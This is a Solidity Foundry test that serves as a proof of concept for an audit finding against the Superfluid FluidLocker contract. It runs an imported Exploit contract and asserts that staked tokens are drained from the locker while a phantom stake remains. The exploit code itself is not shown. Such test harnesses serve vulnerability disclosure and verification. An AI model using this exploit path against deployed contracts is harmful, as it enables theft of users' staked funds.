// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./58281-h-1-staked-tokens-inside-fluidlocker-can-be-withdrawn-withou.sol";

/* Superfluid Locker H-1 — provideLiquidity skips available-balance check (Sherlock 2025-06) */
contract PoC_58281 is Test {
    function test_withdrawWithoutUnstake() public {
        Exploit e = new Exploit();
        e.run{value: 1 ether}();

        assertEq(e.locker().getStakedBalance(), e.FUNDING(), "phantom stake");
        assertEq(e.fluid().balanceOf(address(e.locker())), 0, "locker empty");
        assertGe(e.fluid().balanceOf(address(e.ownerActor())), e.FUNDING() * 95 / 100);

        FluidLocker l = e.locker();
        vm.expectRevert(); // arithmetic underflow: balance (0) < staked (100e18)
        l.getAvailableBalance();
    }
}
